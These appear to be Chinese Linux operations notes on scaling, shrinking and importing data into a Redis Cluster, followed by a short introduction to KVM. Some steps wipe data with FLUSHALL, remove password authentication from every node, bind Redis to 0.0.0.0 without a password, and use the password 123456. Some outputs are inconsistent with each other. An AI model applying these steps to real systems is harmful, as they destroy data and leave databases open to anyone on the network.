[root@redis-node1 ~]#redis-cli -a 123456 --cluster add-node 10.0.0.77:6379 <当前任意集群节点>:6379
[root@node7 ~]# redis-cli -a 123456 --cluster add-node 10.0.0.77:6379 10.0.0.37:6379
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
>>> Adding node 10.0.0.77:6379 to cluster 10.0.0.37:6379
>>> Performing Cluster Check (using node 10.0.0.37:6379)
S: 223a50d47339b5b8ffce99b3a9b3f8882dd99428 10.0.0.37:6379
   slots: (0 slots) slave
   replicates 5766ccb967a7394259cd91d925a3c27aecfbfa69
M: c7e255e8261d28178a9521665034e77b22e5db16 10.0.0.17:6379
   slots:[5461-10922] (5462 slots) master
   1 additional replica(s)
M: 5766ccb967a7394259cd91d925a3c27aecfbfa69 10.0.0.27:6379
   slots:[10923-16383] (5461 slots) master
   1 additional replica(s)
M: 43087894e420e7752aaa428c10a511f511f20c61 10.0.0.7:6379
   slots:[0-5460] (5461 slots) master
   1 additional replica(s)
S: 565416a7a3a5ca5ec9f1101ed63bd345300ccb9e 10.0.0.67:6379
   slots: (0 slots) slave
   replicates c7e255e8261d28178a9521665034e77b22e5db16
S: a0c23b7296bcade9991fff23682e5914264ee549 10.0.0.47:6379
   slots: (0 slots) slave
   replicates 43087894e420e7752aaa428c10a511f511f20c61
[OK] All nodes agree about slots configuration.
>>> Check for open slots...
>>> Check slots coverage...
[OK] All 16384 slots covered.
>>> Send CLUSTER MEET to node 10.0.0.77:6379 to make it join the cluster.
[OK] New node added correctly.
```

**在新的master上重新分配槽位**

```
#1.概述
新的node节点加到集群之后,默认是master节点，但是没有slots，需要重新分配。
添加主机之后需要对添加至集群种的新主机重新分片,否则其没有分片也就无法写入数据。
注意: 重新分配槽位需要清空数据,所以需要先备份数据,扩展后再恢复数据




#2.redis 3.x或者4.x版本的添加方式
[root@redis-node1 ~]# redis-trib.rb check 10.0.0.67:6379 #当前状态
[root@redis-node1 ~]# redis-trib.rb reshard <任意节点>:6379 #重新分片
[root@redis-node1 ~]# redis-trib.rb fix 10.0.0.67:6379 #如果迁移失败使用此命令修复集群



#redis 5.x向上版本
[root@redis-node1 ~]#redis-cli -a 123456 --cluster reshard <当前任意集群节点>:6379  #对10.0.0.27这个集群重新分配槽位
[root@node1 ~]# redis-cli -a 123456 --cluster reshard 10.0.0.27:6379
Warning: Using a password with '-a' or '-u' option on the command line interface 
may not be safe.
>>> Performing Cluster Check (using node 10.0.0.67:6379)
M: d6e2eca6b338b717923f64866bd31d42e52edc98 10.0.0.67:6379
   slots: (0 slots) master
M: d34da8666a6f587283a1c2fca5d13691407f9462 10.0.0.27:6379
   slots:[10923-16383] (5461 slots) master
   1 additional replica(s)
M: d04e524daec4d8e22bdada7f21a9487c2d3e1057 10.0.0.47:6379
   slots:[5461-10922] (5462 slots) master
   1 additional replica(s)
M: cb028b83f9dc463d732f6e76ca6bbcd469d948a7 10.0.0.7:6379
   slots:[0-5460] (5461 slots) master
   1 additional replica(s)
S: 99720241248ff0e4c6fa65c2385e92468b3b5993 10.0.0.17:6379
   slots: (0 slots) slave
   replicates d04e524daec4d8e22bdada7f21a9487c2d3e1057
M: f67f1c02c742cd48d3f48d8c362f9f1b9aa31549 10.0.0.77:6379
   slots: (0 slots) master
S: f9adcfb8f5a037b257af35fa548a26ffbadc852d 10.0.0.37:6379
   slots: (0 slots) slave
   replicates cb028b83f9dc463d732f6e76ca6bbcd469d948a7
S: 9875b50925b4e4f29598e6072e5937f90df9fc71 10.0.0.57:6379
   slots: (0 slots) slave
   replicates d34da8666a6f587283a1c2fca5d13691407f9462
[OK] All nodes agree about slots configuration.
>>> Check for open slots...
>>> Check slots coverage...
[OK] All 16384 slots covered.
How many slots do you want to move (from 1 to 16384)?4096   #新分配多少个槽位
=16384/master个数
What is the receiving node ID? d6e2eca6b338b717923f64866bd31d42e52edc98 #新的master的ID
Please enter all the source node IDs.
 Type 'all' to use all the nodes as source nodes for the hash slots.
 Type 'done' once you entered all the source nodes IDs.
Source node #1: all  #将哪些源主机的槽位分配给新的节点，all是自动在所有的redis node选择划分，如果是从redis cluster删除某个主机可以使用此方式将指定主机上的槽位全部移动到别的redis主机
......
Do you want to proceed with the proposed reshard plan (yes/no)?  yes #确认分配
......
Moving slot 12280 from 10.0.0.28:6379 to 10.0.0.67:6379: .
Moving slot 12281 from 10.0.0.28:6379 to 10.0.0.67:6379: .
Moving slot 12282 from 10.0.0.28:6379 to 10.0.0.67:6379: 
Moving slot 12283 from 10.0.0.28:6379 to 10.0.0.67:6379: ..
Moving slot 12284 from 10.0.0.28:6379 to 10.0.0.67:6379: 
Moving slot 12285 from 10.0.0.28:6379 to 10.0.0.67:6379:






#3.确定slot分配成功
[root@node1 ~]# redis-cli -a 123456 --cluster check 10.0.0.7:6379
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.0.0.7:6379 (43087894...) -> 2511 keys | 4096 slots | 1 slaves.
10.0.0.27:6379 (5766ccb9...) -> 2500 keys | 4096 slots | 1 slaves.
10.0.0.17:6379 (c7e255e8...) -> 2515 keys | 4096 slots | 1 slaves.
10.0.0.77:6379 (ee90de46...) -> 2474 keys | 4096 slots | 0 slaves.  #槽位分配成功！！！
[OK] 10000 keys in 4 masters.
0.61 keys per slot on average.
>>> Performing Cluster Check (using node 10.0.0.7:6379)
M: 43087894e420e7752aaa428c10a511f511f20c61 10.0.0.7:6379
   slots:[1365-5460] (4096 slots) master
   1 additional replica(s)
S: a0c23b7296bcade9991fff23682e5914264ee549 10.0.0.47:6379
   slots: (0 slots) slave
   replicates 43087894e420e7752aaa428c10a511f511f20c61
S: 223a50d47339b5b8ffce99b3a9b3f8882dd99428 10.0.0.37:6379
   slots: (0 slots) slave
   replicates 5766ccb967a7394259cd91d925a3c27aecfbfa69
M: 5766ccb967a7394259cd91d925a3c27aecfbfa69 10.0.0.27:6379
   slots:[12288-16383] (4096 slots) master
   1 additional replica(s)
M: c7e255e8261d28178a9521665034e77b22e5db16 10.0.0.17:6379
   slots:[6827-10922] (4096 slots) master
   1 additional replica(s)
S: 565416a7a3a5ca5ec9f1101ed63bd345300ccb9e 10.0.0.67:6379
   slots: (0 slots) slave
   replicates c7e255e8261d28178a9521665034e77b22e5db16
M: ee90de46239b595bcb485365439efdd41a3c56db 10.0.0.77:6379
   slots:[0-1364],[5461-6826],[10923-12287] (4096 slots) master
[OK] All nodes agree about slots configuration.
>>> Check for open slots...
>>> Check slots coverage...
[OK] All 16384 slots covered.
```

**为新的master添加新的slave节点**

```
#1.概述
需要再向当前的Redis集群中添加一个Redis单机服务器10.0.0.87，用于解决当前10.0.0.77单机的潜在宕机问题，即实现响应的高可用功能。




#2.redis 3.x或者4.x版本的添加方式
redis-trib.rb add-node --slave --master-id 750cab050bc81f2655ed53900fd43d2e64423333 10.0.0.87:6379 <任意集群节点>:6379


#redis 5.x向上版本

[root@node1 ~]# redis-cli -a 123456 --cluster add-node 10.0.0.87:6379 10.0.0.7:6379 --cluster-slave --cluster-master-id ee90de46239b595bcb485365439efdd41a3c56db
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
>>> Adding node 10.0.0.87:6379 to cluster 10.0.0.7:6379
>>> Performing Cluster Check (using node 10.0.0.7:6379)
M: 43087894e420e7752aaa428c10a511f511f20c61 10.0.0.7:6379
   slots:[1365-5460] (4096 slots) master
   1 additional replica(s)
S: a0c23b7296bcade9991fff23682e5914264ee549 10.0.0.47:6379
   slots: (0 slots) slave
   replicates 43087894e420e7752aaa428c10a511f511f20c61
S: 223a50d47339b5b8ffce99b3a9b3f8882dd99428 10.0.0.37:6379
   slots: (0 slots) slave
   replicates 5766ccb967a7394259cd91d925a3c27aecfbfa69
M: 5766ccb967a7394259cd91d925a3c27aecfbfa69 10.0.0.27:6379
   slots:[12288-16383] (4096 slots) master
   1 additional replica(s)
M: c7e255e8261d28178a9521665034e77b22e5db16 10.0.0.17:6379
   slots:[6827-10922] (4096 slots) master
   1 additional replica(s)
S: 565416a7a3a5ca5ec9f1101ed63bd345300ccb9e 10.0.0.67:6379
   slots: (0 slots) slave
   replicates c7e255e8261d28178a9521665034e77b22e5db16
M: ee90de46239b595bcb485365439efdd41a3c56db 10.0.0.77:6379
   slots:[0-1364],[5461-6826],[10923-12287] (4096 slots) master
[OK] All nodes agree about slots configuration.
>>> Check for open slots...
>>> Check slots coverage...
[OK] All 16384 slots covered.
>>> Send CLUSTER MEET to node 10.0.0.87:6379 to make it join the cluster.
Waiting for the cluster to join

>>> Configure node as replica of 10.0.0.77:6379.
[OK] New node added correctly.






#3.验证是否成功
[root@node1 ~]# redis-cli -a 123456 --cluster check 10.0.0.7:6379
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.0.0.7:6379 (43087894...) -> 2511 keys | 4096 slots | 1 slaves.
10.0.0.27:6379 (5766ccb9...) -> 2500 keys | 4096 slots | 1 slaves.
10.0.0.17:6379 (c7e255e8...) -> 2515 keys | 4096 slots | 1 slaves.
10.0.0.77:6379 (ee90de46...) -> 2474 keys | 4096 slots | 1 slaves.   #从节点添加成功！！
[OK] 10000 keys in 4 masters.
0.61 keys per slot on average.
>>> Performing Cluster Check (using node 10.0.0.7:6379)
M: 43087894e420e7752aaa428c10a511f511f20c61 10.0.0.7:6379
   slots:[1365-5460] (4096 slots) master
   1 additional replica(s)
S: a0c23b7296bcade9991fff23682e5914264ee549 10.0.0.47:6379
   slots: (0 slots) slave
   replicates 43087894e420e7752aaa428c10a511f511f20c61
S: 223a50d47339b5b8ffce99b3a9b3f8882dd99428 10.0.0.37:6379
   slots: (0 slots) slave
   replicates 5766ccb967a7394259cd91d925a3c27aecfbfa69
S: 3ed3c9d0548020bf79dc79bc62d78272bbc7639e 10.0.0.87:6379
   slots: (0 slots) slave
   replicates ee90de46239b595bcb485365439efdd41a3c56db
M: 5766ccb967a7394259cd91d925a3c27aecfbfa69 10.0.0.27:6379
   slots:[12288-16383] (4096 slots) master
   1 additional replica(s)
M: c7e255e8261d28178a9521665034e77b22e5db16 10.0.0.17:6379
   slots:[6827-10922] (4096 slots) master
   1 additional replica(s)
S: 565416a7a3a5ca5ec9f1101ed63bd345300ccb9e 10.0.0.67:6379
   slots: (0 slots) slave
   replicates c7e255e8261d28178a9521665034e77b22e5db16
M: ee90de46239b595bcb485365439efdd41a3c56db 10.0.0.77:6379
   slots:[0-1364],[5461-6826],[10923-12287] (4096 slots) master
   1 additional replica(s)
[OK] All nodes agree about slots configuration.
>>> Check for open slots...
>>> Check slots coverage...
[OK] All 16384 slots covered.
```

##### 45.4.7.7 Redis集群动态缩容

**生产案例：**

```
由于10.0.0.8服务器使用年限已经超过三年，已经超过厂商质保期而且硬盘出现异常报警，经运维部架构师提交方案并同开发同事开会商议，决定将现有Redis集群的8台主服务器中的master 10.0.0.8和对应slave 10.0.0.38 临时下线，三台服务器的并发写入性能足够支出未来1-2年的业务需求。


删除节点过程：
添加节点的时候是先添加node节点到集群，然后分配槽位，删除节点的操作与添加节点的操作正好相反，是先将被删除的Redis node上的槽位迁移到集群中的其他Redis node节点上，然后再将其删除，如果一个Redis node节点上的槽位没有被完全迁移，删除该node的时候会提示有数据且无法删除。

3.3.6.2.1 迁移master 的槽位之其他master。
注意: 被迁移Redis master源服务器必须保证没有数据，否则迁移报错并会被强制中断。
```

**Redis 3.x或4.x 版本**

```
[root@redis-node1 ~]# redis-trib.rb reshard 10.0.0.8:6379
[root@redis-node1 ~]# redis-trib.rb fix 10.0.0.8:6379 #如果迁移失败使用此命令修复集群
```

**Redis 5.x向上版本**

```
#1.缩容之前一定要先备份数据，然后清空所有的数据
[root@node1 ~]# redis-cli -a 123456 -h 10.0.0.67 flushall
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
OK






#2.进行缩容(重复三次)
#第一次移除卡槽
[root@node1 ~]# redis-cli -a 123456 --cluster reshard 10.0.0.27:6379
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
>>> Performing Cluster Check (using node 10.0.0.27:6379)
M: 5766ccb967a7394259cd91d925a3c27aecfbfa69 10.0.0.27:6379
   slots:[12288-16383] (4096 slots) master
   1 additional replica(s)
S: a0c23b7296bcade9991fff23682e5914264ee549 10.0.0.47:6379
   slots: (0 slots) slave
   replicates 43087894e420e7752aaa428c10a511f511f20c61
S: 3ed3c9d0548020bf79dc79bc62d78272bbc7639e 10.0.0.87:6379
   slots: (0 slots) slave
   replicates ee90de46239b595bcb485365439efdd41a3c56db
M: c7e255e8261d28178a9521665034e77b22e5db16 10.0.0.17:6379
   slots:[6827-10922] (4096 slots) master
   1 additional replica(s)
S: 223a50d47339b5b8ffce99b3a9b3f8882dd99428 10.0.0.37:6379
   slots: (0 slots) slave
   replicates 5766ccb967a7394259cd91d925a3c27aecfbfa69
M: 43087894e420e7752aaa428c10a511f511f20c61 10.0.0.7:6379
   slots:[1365-5460] (4096 slots) master
   1 additional replica(s)
M: ee90de46239b595bcb485365439efdd41a3c56db 10.0.0.77:6379
   slots:[0-1364],[5461-6826],[10923-12287] (4096 slots) master
   1 additional replica(s)
S: 565416a7a3a5ca5ec9f1101ed63bd345300ccb9e 10.0.0.67:6379
   slots: (0 slots) slave
   replicates c7e255e8261d28178a9521665034e77b22e5db16
[OK] All nodes agree about slots configuration.
>>> Check for open slots...
>>> Check slots coverage...
[OK] All 16384 slots covered.
How many slots do you want to move (from 1 to 16384)? 1365   #共4096/3分别给其它三个master节点
What is the receiving node ID? 43087894e420e7752aaa428c10a511f511f20c61 #master 10.0.0.7
Please enter all the source node IDs.
  Type 'all' to use all the nodes as source nodes for the hash slots.
  Type 'done' once you entered all the source nodes IDs.
Source node #1: ee90de46239b595bcb485365439efdd41a3c56db    #输入要删除10.0.0.77节点ID
Source node #2: done   #修改此处
...
    Moving slot 1360 from ee90de46239b595bcb485365439efdd41a3c56db
    Moving slot 1361 from ee90de46239b595bcb485365439efdd41a3c56db
    Moving slot 1362 from ee90de46239b595bcb485365439efdd41a3c56db
    Moving slot 1363 from ee90de46239b595bcb485365439efdd41a3c56db
    Moving slot 1364 from ee90de46239b595bcb485365439efdd41a3c56db
...
Do you want to proceed with the proposed reshard plan (yes/no)?yes  #修改此处
...
Moving slot 1359 from 10.0.0.77:6379 to 10.0.0.7:6379: .
Moving slot 1360 from 10.0.0.77:6379 to 10.0.0.7:6379: .
Moving slot 1361 from 10.0.0.77:6379 to 10.0.0.7:6379: 
Moving slot 1362 from 10.0.0.77:6379 to 10.0.0.7:6379: 
Moving slot 1363 from 10.0.0.77:6379 to 10.0.0.7:6379: 
Moving slot 1364 from 10.0.0.77:6379 to 10.0.0.7:6379:
...


#第二次移除卡槽
[root@node1 ~]# redis-cli -a 123456 --cluster reshard 10.0.0.27:6379
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
>>> Performing Cluster Check (using node 10.0.0.27:6379)
M: 5766ccb967a7394259cd91d925a3c27aecfbfa69 10.0.0.27:6379
   slots:[12288-16383] (4096 slots) master
   1 additional replica(s)
S: a0c23b7296bcade9991fff23682e5914264ee549 10.0.0.47:6379
   slots: (0 slots) slave
   replicates 43087894e420e7752aaa428c10a511f511f20c61
S: 3ed3c9d0548020bf79dc79bc62d78272bbc7639e 10.0.0.87:6379
   slots: (0 slots) slave
   replicates ee90de46239b595bcb485365439efdd41a3c56db
M: c7e255e8261d28178a9521665034e77b22e5db16 10.0.0.17:6379
   slots:[6827-10922] (4096 slots) master
   1 additional replica(s)
S: 223a50d47339b5b8ffce99b3a9b3f8882dd99428 10.0.0.37:6379
   slots: (0 slots) slave
   replicates 5766ccb967a7394259cd91d925a3c27aecfbfa69
M: 43087894e420e7752aaa428c10a511f511f20c61 10.0.0.7:6379
   slots:[0-5460] (5461 slots) master
   1 additional replica(s)
M: ee90de46239b595bcb485365439efdd41a3c56db 10.0.0.77:6379
   slots:[5461-6826],[10923-12287] (2731 slots) master
   1 additional replica(s)
S: 565416a7a3a5ca5ec9f1101ed63bd345300ccb9e 10.0.0.67:6379
   slots: (0 slots) slave
   replicates c7e255e8261d28178a9521665034e77b22e5db16
[OK] All nodes agree about slots configuration.
>>> Check for open slots...
>>> Check slots coverage...
[OK] All 16384 slots covered.
How many slots do you want to move (from 1 to 16384)? 1366  #修改为1366
What is the receiving node ID? c7e255e8261d28178a9521665034e77b22e5db16    #master 10.0.0.17
Please enter all the source node IDs.
  Type 'all' to use all the nodes as source nodes for the hash slots.
  Type 'done' once you entered all the source nodes IDs.
Source node #1: ee90de46239b595bcb485365439efdd41a3c56db    #输入要删除10.0.0.77节点ID
Source node #2: done  #修改此处
Do you want to proceed with the proposed reshard plan (yes/no)? yes  #修改此处
...
Moving slot 6819 from 10.0.0.77:6379 to 10.0.0.17:6379: ..
Moving slot 6820 from 10.0.0.77:6379 to 10.0.0.17:6379: .
Moving slot 6821 from 10.0.0.77:6379 to 10.0.0.17:6379: .
...


#第三次移除卡槽
[root@node1 ~]# redis-cli -a 123456 --cluster reshard 10.0.0.27:6379
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
>>> Performing Cluster Check (using node 10.0.0.27:6379)
M: 5766ccb967a7394259cd91d925a3c27aecfbfa69 10.0.0.27:6379
   slots:[12288-16383] (4096 slots) master
   1 additional replica(s)
S: a0c23b7296bcade9991fff23682e5914264ee549 10.0.0.47:6379
   slots: (0 slots) slave
   replicates 43087894e420e7752aaa428c10a511f511f20c61
S: 3ed3c9d0548020bf79dc79bc62d78272bbc7639e 10.0.0.87:6379
   slots: (0 slots) slave
   replicates ee90de46239b595bcb485365439efdd41a3c56db
M: c7e255e8261d28178a9521665034e77b22e5db16 10.0.0.17:6379
   slots:[5461-10922] (5462 slots) master
   1 additional replica(s)
S: 223a50d47339b5b8ffce99b3a9b3f8882dd99428 10.0.0.37:6379
   slots: (0 slots) slave
   replicates 5766ccb967a7394259cd91d925a3c27aecfbfa69
M: 43087894e420e7752aaa428c10a511f511f20c61 10.0.0.7:6379
   slots:[0-5460] (5461 slots) master
   1 additional replica(s)
M: ee90de46239b595bcb485365439efdd41a3c56db 10.0.0.77:6379
   slots:[10923-12287] (1365 slots) master
   1 additional replica(s)
S: 565416a7a3a5ca5ec9f1101ed63bd345300ccb9e 10.0.0.67:6379
   slots: (0 slots) slave
   replicates c7e255e8261d28178a9521665034e77b22e5db16
[OK] All nodes agree about slots configuration.
>>> Check for open slots...
>>> Check slots coverage...
[OK] All 16384 slots covered.
How many slots do you want to move (from 1 to 16384)? 1365  #修改此处
What is the receiving node ID? 5766ccb967a7394259cd91d925a3c27aecfbfa69   #master 10.0.0.27
Please enter all the source node IDs.
  Type 'all' to use all the nodes as source nodes for the hash slots.
  Type 'done' once you entered all the source nodes IDs.
Source node #1: ee90de46239b595bcb485365439efdd41a3c56db    #输入要删除10.0.0.77节点ID
Source node #2: done   #修改此处
Do you want to proceed with the proposed reshard plan (yes/no)? yes   #修改此处
...
Moving slot 12285 from 10.0.0.77:6379 to 10.0.0.27:6379: .
Moving slot 12286 from 10.0.0.77:6379 to 10.0.0.27:6379: 
Moving slot 12287 from 10.0.0.77:6379 to 10.0.0.27:6379:
...
```

**从集群删除服务器**

```
#1.概述
虽然槽位已经迁移完成，但是服务器IP信息还在集群当中，因此还需要将IP信息从集群删除。
注意: 删除服务器前,必须清除主机上面的槽位,否则会删除主机失败。





#2.Redis 3.x或4.x 版本
[root@s~]#redis-trib.rb del-node 10.0.0.7:6379 
dfffc371085859f2858730e1f350e9167e287073
>>> Removing node dfffc371085859f2858730e1f350e9167e287073 from cluster
192.168.7.102:6379
>>> Sending CLUSTER FORGET messages to the cluster...
>>> SHUTDOWN the node.



#Redis 5.x向上版本
[root@node1 ~]# redis-cli -a 123456 --cluster del-node 10.0.0.7:6379 ee90de46239b595bcb485365439efdd41a3c56db   #删除10.0.0.77节点
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
>>> Removing node ee90de46239b595bcb485365439efdd41a3c56db from cluster 10.0.0.7:6379
>>> Sending CLUSTER FORGET messages to the cluster...
>>> Sending CLUSTER RESET SOFT to the deleted node

[root@node1 ~]# redis-cli -a 123456 --cluster del-node 10.0.0.7:6379 3ed3c9d0548020bf79dc79bc62d78272bbc7639e   #删除10.0.0.87节点
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
>>> Removing node 3ed3c9d0548020bf79dc79bc62d78272bbc7639e from cluster 10.0.0.7:6379
>>> Sending CLUSTER FORGET messages to the cluster...
>>> Sending CLUSTER RESET SOFT to the deleted node.






#3.查看当前节点状态
[root@node1 ~]# redis-cli -a 123456 -h 10.0.0.7 cluster nodes
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
43087894e420e7752aaa428c10a511f511f20c61 10.0.0.7:6379@16379 myself,master - 0 0 8 connected 0-5460
a0c23b7296bcade9991fff23682e5914264ee549 10.0.0.47:6379@16379 slave 43087894e420e7752aaa428c10a511f511f20c61 0 1658399994329 8 connected
223a50d47339b5b8ffce99b3a9b3f8882dd99428 10.0.0.37:6379@16379 slave 5766ccb967a7394259cd91d925a3c27aecfbfa69 0 1658399992257 10 connected
5766ccb967a7394259cd91d925a3c27aecfbfa69 10.0.0.27:6379@16379 master - 0 1658399991247 10 connected 10923-16383
c7e255e8261d28178a9521665034e77b22e5db16 10.0.0.17:6379@16379 master - 0 1658399989235 9 connected 5461-10922
565416a7a3a5ca5ec9f1101ed63bd345300ccb9e 10.0.0.67:6379@16379 slave c7e255e8261d28178a9521665034e77b22e5db16 0 1658399993287 9 connected
```

##### 45.4.7.8 Redis集群数据迁移

**生产案例：**

```
公司将redis cluster部署完成之后，需要将之前的数据导入之Redis cluster集群，但是由于Redis cluster使用的分片保存key的机制，因此使用传统的AOF文件或RDB快照无法满足需求，因此需要使用集群数据导入命令完成。

注意: 导入数据需要redis cluster不能与被导入的数据有重复的key名称，否则导入不成功或中断。
```

**基础环境准备**

```
#1.在10.0.0.57机器上先造数据
[19:07:49 root@centos7 ~]#yum -y install redis python3 python3-redis
[19:22:53 root@centos7 ~]#sed -i 's/bind 127.0.0.1/bind 0.0.0.0/' /etc/redis.conf
[19:07:49 root@centos7 ~]#cat redis_test.py 
#!/bin/env python3 
import redis
pool = redis.ConnectionPool(host="127.0.0.1",port=6379,password="",decode_responses=True)
r = redis.Redis(connection_pool=pool)
for i in range(100000):
    r.set("liu%d" % i,"v%d" % i)
    data=r.get("liu%d" % i)
    print(data)
[19:08:46 root@centos7 ~]#chmod +x redis_test.py 
[19:08:46 root@centos7 ~]#./redis_test.py
[19:23:42 root@centos7 ~]#systemctl restart redis




#2.在所有节点包括master和slave节点上关闭各Redis密码认证
[root@node1 ~]# redis-cli  -p 6379 -a 123456 --no-auth-warning CONFIG SET requirepass ""
```

**执行数据导入**

```
#1.命令参数
#Redis 3.x或4.x 版本
[root@redis ~]# redis-trib.rb import --from <外部Redis node-IP:PORT> --replace <集群服务器IP:PORT>



#Redis 5.x向上版本
[root@redis ~]#redis-cli --cluster import <集群服务器IP:PORT> --cluster-from <外部Redis node-IP:PORT> --cluster-copy --cluster-replace
#只使用cluster-copy，则要导入集群中的key不能存在
#如果集群中已有同样的key，如果需要替换，可以cluster-copy和cluster-replace联用，这样集群中的key就会被替换为外部数据




#2.案例
[root@node1 ~]# redis-cli --cluster import 10.0.0.7:6379 --cluster-from 10.0.0.57:6379 --cluster-copy --cluster-replace
>>> Importing data from 10.0.0.57:6379 to cluster 10.0.0.7:6379
>>> Performing Cluster Check (using node 10.0.0.7:6379)
S: 43087894e420e7752aaa428c10a511f511f20c61 10.0.0.7:6379
   slots: (0 slots) slave
   replicates a0c23b7296bcade9991fff23682e5914264ee549
M: a0c23b7296bcade9991fff23682e5914264ee549 10.0.0.47:6379
   slots:[0-5460] (5461 slots) master
   1 additional replica(s)
S: 223a50d47339b5b8ffce99b3a9b3f8882dd99428 10.0.0.37:6379
   slots: (0 slots) slave
   replicates 5766ccb967a7394259cd91d925a3c27aecfbfa69
M: 5766ccb967a7394259cd91d925a3c27aecfbfa69 10.0.0.27:6379
   slots:[10923-16383] (5461 slots) master
   1 additional replica(s)
M: c7e255e8261d28178a9521665034e77b22e5db16 10.0.0.17:6379
   slots:[5461-10922] (5462 slots) master
   1 additional replica(s)
S: 565416a7a3a5ca5ec9f1101ed63bd345300ccb9e 10.0.0.67:6379
   slots: (0 slots) slave
   replicates c7e255e8261d28178a9521665034e77b22e5db16
[OK] All nodes agree about slots configuration.
>>> Check for open slots...
>>> Check slots coverage...
[OK] All 16384 slots covered
```

![1658403273882](linux体系.assets/1658403273882.png)

##### 45.4.7.9 集群偏斜

```
redis cluster 多个节点运行一段时间后,可能会出现倾斜现象,某个节点数据偏多,内存消耗更大,或者接受用户请求访问更多

发生倾斜的原因可能如下:
1）节点和槽分配不均
2）不同槽对应键值数量差异较大
3）包含bigkey,建议少用
4）内存相关配置不一致
5）热点数据不均衡 : 一致性不高时,可以使用本缓存和MQ
```

**获取指定槽位中对应键key值的个数**

```
#1.命令参数
redis-cli cluster countkeysinslot {slot的值}


#2.范例: 获取指定slot对应的key个数
[root@centos8 ~]#redis-cli -a 123456 cluster countkeysinslot 1
(integer) 0
[root@centos8 ~]#redis-cli -a 123456 cluster countkeysinslot 2
(integer) 0
[root@centos8 ~]#redis-cli -a 123456 cluster countkeysinslot 3
(integer) 1
```

**执行自动的槽位重新平衡分布,但会影响客户端的访问,此方法慎用**

```
#1.命令参数
redis-cli --cluster rebalance <集群节点IP:PORT>



#2.范例: 执行自动的槽位重新平衡分布
[root@centos8 ~]#redis-cli -a 123456 --cluster rebalance 10.0.0.7:6379
>>> Performing Cluster Check (using node 10.0.0.8:6379)
[OK] All nodes agree about slots configuration.
>>> Check for open slots...
>>> Check slots coverage...
[OK] All 16384 slots covered.
*** No rebalancing needed! All nodes are within the 2.00% threshold.
```

**获取bigkey ,建议在slave节点执行**

```
#1.命令参数
#redis-cli --bigkeys



#2.范例: 查找bigkey
[root@node5 ~]# redis-cli -a 123456 --bigkeys
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
Warning: AUTH failed

# Scanning the entire keyspace to find biggest keys as well as
# average sizes per key type.  You can use -i 0.1 to sleep 0.1 sec
# per 100 SCAN commands (not usually needed).

[00.00%] Biggest string found so far '"key3371"' with 9 bytes

-------- summary -------

Sampled 820 keys in the keyspace!
Total key length in bytes is 5646 (avg len 6.89)

Biggest string found '"key3371"' has 9 bytes

0 lists with 0 items (00.00% of keys, avg size 0.00)
0 hashs with 0 fields (00.00% of keys, avg size 0.00)
820 strings with 7286 bytes (100.00% of keys, avg size 8.89)
0 streams with 0 entries (00.00% of keys, avg size 0.00)
0 sets with 0 members (00.00% of keys, avg size 0.00)
0 zsets with 0 members (00.00% of keys, avg size 0.00)
```

##### 45.4.7.10 redis cluster的局限性

```
1）大多数时客户端性能会”降低”
2）命令无法跨节点使用:mget、keys、scan、flush、sinter等
3）客户端维护更复杂:SDK和应用本身消耗(例如更多的连接池)
4）不支持多个数据库︰集群模式下只有一个db 0
5）复制只支持一层∶不支持树形复制结构,不支持级联复制
6）Key事务和Lua支持有限∶操作的key必须在一个节点,Lua和事务无法跨节点使用
```

## 46.KVM虚拟化

### 46.1虚拟化和云计算的对比

|   项目   |                  虚拟化                  |                   云计算                   |
| :------: | :--------------------------------------: | :----------------------------------------: |
|   定义   |                   技术                   |                    方法                    |
|   目的   |   从 1 个物理硬件系统创建多个模拟环境    |    汇聚并自动化分配虚拟资源以供按需使用    |
|   用途   |    针对具体用途为特定用户提供打包资源    |     针对多种用途为用户群组提供不同资源     |
|   配置   |                 基于镜像                 |                  基于模板                  |
|   成本   | 资本性支出（CAPEX）高、运营支出 (OPEX)低 | 私有云：CAPEX 高、OPEX低 公共云： CAPEX 低 |
| 可扩展性 |                 纵向扩展                 |                  横向扩展                  |
| 使用场景 |             少量服务器的环境             |             众多服务器的大环境             |

### 46.2 KVM介绍

```
KVM（ Kernel-based Virtual Machine）是一个完整的虚拟化解决方案，适用于包含虚拟化扩展（Intel VT或AMD-V）的x86硬件上的Linux。目前也支持ARM等其它硬件平台. 它由可加载的内核模块kvm.ko组成，它提供核心虚拟化基础架构和处理器特定模块，kvm-intel.ko或kvm-amd.ko，KVM的用户空间组件包含在QEMU1.3后续版本中,KVM目前已成为学术界的主流 VMM (virtual machine monitor，虚拟机监视器，也称为 hypervisor)之一。

KVM是开源软件，可运行多个运行未修改的Linux或Windows映像的虚拟机。
依赖于HVM；Intel VT-x, AMD AMD-V。
官网： https://www.linux-kvm.org
```

![1658482774443](linux体系.assets/1658482774443.png)

### 46.3 KVM架构

#### 46.3.1 KVM体系结构

```
KVM 是基于虚拟化扩展（Intel VT 或者 AMD-V）的 X86 硬件的开源的 Linux 原生的全虚拟化解决方案。KVM 中，虚拟机被实现为常规的 Linux 进程，由标准 Linux 调度程序进行调度；虚机的每个虚拟CPU 被实现为一个常规的 Linux 进程。这使得 KVM 能够使用 Linux 内核的已有功能。

但是，KVM 本身不执行任何硬件模拟，需要客户空间程序通过 /dev/kvm 接口设置一个客户机虚拟服务器的地址空间，向它提供模拟的 I/O，并将它的视频显示映射回宿主的显示屏。目前这个应用程序是QEMU。
```

![1658483266769](linux体系.assets/1658483266769.png)

```
KVM： 初始化CPU硬件,打开虚拟机模式,负责CPU,内存,中断控制器,时钟. 由内核模块kvm_xxx.ko实现，工作于hypervisor，备/dev/kvm，是一个字符设备，在用户空间可通过ioctl()系统调用来完成VM创建、启动，为VM分配内存、读写VCPU的寄存器、向VCPU注入中断、时钟等管理功能。

QEMU进程：工作于用户空间，主要用于实现模拟IO设备,如显卡，网卡，硬盘等， qemu-kvm进程：工作于用户空间，用于实现一个虚拟机实例。

